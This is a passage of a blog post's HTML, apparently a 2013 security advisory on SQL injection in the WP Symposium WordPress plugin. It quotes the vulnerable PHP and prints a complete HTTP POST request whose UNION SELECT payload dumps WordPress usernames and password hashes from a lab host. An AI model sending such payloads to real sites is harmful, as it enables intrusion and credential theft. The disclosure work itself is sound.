@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]-->
+<!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]-->
+<!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
+<html lang="en-US">
+<!--<![endif]-->
+<head>
+<base href="http://ceriksen.com" />
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+<title>WP Symposium multiple SQL injection vulnerabilities | ceriksen.com</title>
+
+<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />
+
+<!--[if lt IE 9]>
+<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
+<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
+<![endif]-->
+
+
+
+<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
+var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/comment-reply.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>
+
+ 
+
+<link rel='next' title='WordPress Online Store arbitrary file disclosure' href='http://ceriksen.com/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/' />
+
+<link rel='canonical' href='http://ceriksen.com/2013/02/18/wp-symposium-multiple-sql-injection/' />
+<link rel='shortlink' href='http://ceriksen.com/?p=132' />
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-32892239-1']);
+_gaq.push(['_trackPageview']);
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+
+	<script type="text/javascript">
+		jQuery(document).ready(function(){
+			jQuery("#page").fitVids();	 
+		});
+	</script>	<style type="text/css">
+			#site-title a,
+		#site-description {
+			color: #e6941e !important;
+		}
+		</style>
+	
+</head>
+
+<body lang="en" class="single single-post postid-132 single-format-standard  single-author singular">
+<div id="page" class="hfeed">
+	<header id="branding" role="banner">
+		<hgroup>
+			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
+			<h2 id="site-description"></h2>
+						
+							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
+				<div>
+					<label class="screen-reader-text" for="s">Search for:</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="Search" />
+				</div>
+			</form>					</hgroup>
+		
+		<nav id="access" role="navigation">
+			<h2 class="assistive-text">Main menu</h2>
+			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
+
+			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>
+
+		</nav><!-- #access -->
+		<div class="clear"></div>
+	</header><!-- #branding -->
+
+	<div id="main">
+		<div id="primary">
+			<div id="content" role="main">
+
+			
+				
+				
+<article id="post-132" class="post-132 post type-post status-publish format-standard hentry category-advisories tag-sql-injection tag-symposium tag-wordpress-plugin">
+	<header class="entry-header">
+				<h2 class="entry-title">WP Symposium multiple SQL injection vulnerabilities</h2>
+		
+		<div class="entry-meta">
+			<a href="http://ceriksen.com/2013/02/18/wp-symposium-multiple-sql-injection/" title="10:33 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:33:09+00:00" pubdate>February 18, 2013</time></a>		</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+				<p><strong>Advisory</strong></p>
+<p><a href="http://secunia.com/advisories/50674/">Secunia Advisory SA50674</a></p>
+<p><strong>Analysis of groups get_user_list SQL injection vulnerability</strong></p>
+<p>This first vulnerability in the <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_groups_functions.php">/ajax/symposium_groups_functions.php</a> file makes use of the functionality for people to view the users of a group. It accepts a groupID(gid) which it inserts without validation into a query and then spits out the result, even if you are not authenticated.</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785efe86068742713" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+// Get group members
+if ($_POST['action'] == 'get_group_members') {
+
+	$gid = $_POST['gid'];
+
+	// First clean up the table, making sure there are no user ID = 0 (do across all groups)
+	$sql = "DELETE FROM ".$wpdb-&gt;prefix."symposium_group_members WHERE member_id = 0";
+	$wpdb-&gt;query($sql);
+
+	// Now get the members
+	$sql = "SELECT u.ID, u.display_name, u.user_login FROM ".$wpdb-&gt;prefix."symposium_group_members m
+			LEFT JOIN ".$wpdb-&gt;base_prefix."users u ON m.member_id = u.ID
+			WHERE group_id = ".$gid." AND m.admin != 'on'
+			ORDER BY u.display_name";
+	$users = $wpdb-&gt;get_results($sql);
+
+	$html = '';
+	if ($users) {
+		foreach ($users as $user) {
+			$html .= '&lt;div class="user_list_item" id="'.$user-&gt;ID.'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;';
+			$html .= "&lt;img src='".get_option('symposium_images')."/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; ";
+			$html .= $user-&gt;display_name.' ('.$user-&gt;ID.')';
+			$html .= '&lt;/div&gt;';
+		}	
+	}
+
+	echo $html;
+	exit;
+}</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785efe86068742713-218">218</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-219">219</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-220">220</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-221">221</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-222">222</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-223">223</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-224">224</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-225">225</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-226">226</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-227">227</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-228">228</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-229">229</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-230">230</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-231">231</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-232">232</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-233">233</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-234">234</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-235">235</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-236">236</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-237">237</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-238">238</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-239">239</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-240">240</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-241">241</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-242">242</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-243">243</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-244">244</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efe86068742713-245">245</div><div class="crayon-num" data-line="crayon-53c98785efe86068742713-246">246</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785efe86068742713-218"><span class="crayon-c">// Get group members</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-219"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'get_group_members'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-220">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-221"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'gid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-222">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-223"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// First clean up the table, making sure there are no user ID = 0 (do across all groups)</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-224"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"DELETE FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members WHERE member_id = 0"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-225"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-226">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-227"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Now get the members</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-228"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT u.ID, u.display_name, u.user_login FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members m</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-229"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LEFT JOIN "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u ON m.member_id = u.ID</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-230"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WHERE group_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$gid</span><span class="crayon-sy">.</span><span class="crayon-s">" AND m.admin != 'on'</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-231"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ORDER BY u.display_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-232"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-233">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efe86068742713-234"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-235"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-236"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-237"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;div class="user_list_item" id="'</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-238"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;img src='"</span><span class="crayon-sy">.</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_images'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-239"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">display_name</span><span class="crayon-sy">.</span><span class="crayon-s">' ('</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">')'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-240"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-241"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-242"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-243">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efe86068742713-244"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$html</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efe86068742713-245"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efe86068742713-246"><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0178 seconds] -->
+<p>Because it uses multiple line, we have to do a bit more work than the other ones. We can craft an union select which fits in and uses the rest of the query without a problem like this, and dump a list of usernames and password hashes:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785efeb3806254095" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_groups_functions.php HTTP/1.0
+Host: 192.168.80.130
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
+Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+
+action=get_user_list&amp;gid=353234) AND 1=2 UNION SELECT user_pass, 2, 3, 4, 5, 6, 7, 8, 9, display_name, 11 FROM wp_users WHERE (1=1</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785efeb3806254095-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efeb3806254095-2">2</div><div class="crayon-num" data-line="crayon-53c98785efeb3806254095-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efeb3806254095-4">4</div><div class="crayon-num" data-line="crayon-53c98785efeb3806254095-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efeb3806254095-6">6</div><div class="crayon-num" data-line="crayon-53c98785efeb3806254095-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efeb3806254095-8">8</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785efeb3806254095-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_groups_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efeb3806254095-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98785efeb3806254095-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efeb3806254095-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98785efeb3806254095-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efeb3806254095-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">130</span></div><div class="crayon-line" id="crayon-53c98785efeb3806254095-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efeb3806254095-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">get_user_list</span><span class="crayon-o">&amp;</span><span class="crayon-v">gid</span><span class="crayon-o">=</span><span class="crayon-cn">353234</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-i">user_pass</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span 